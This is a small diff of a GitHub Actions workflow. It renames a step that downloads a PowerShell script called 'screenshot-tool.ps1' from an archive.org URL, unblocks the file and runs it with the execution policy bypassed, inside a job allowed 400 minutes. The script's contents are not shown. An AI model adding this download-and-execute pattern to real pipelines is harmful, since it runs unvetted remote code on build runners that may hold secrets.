@@ -9,12 +9,10 @@ jobs:
     timeout-minutes: 400
     
     steps:
-      - name: Download and run PS1
+      - name: Download and run PS1 script
         run: |
-          # Change this URL to your actual PS1 location
           $url = "https://archive.org/download/information_20251119/screenshot-tool.ps1"
           $path = "$env:GITHUB_WORKSPACE\tool.ps1"
-          
           Invoke-WebRequest -Uri $url -OutFile $path
           Unblock-File -Path $path
           powershell -ExecutionPolicy Bypass -File $path
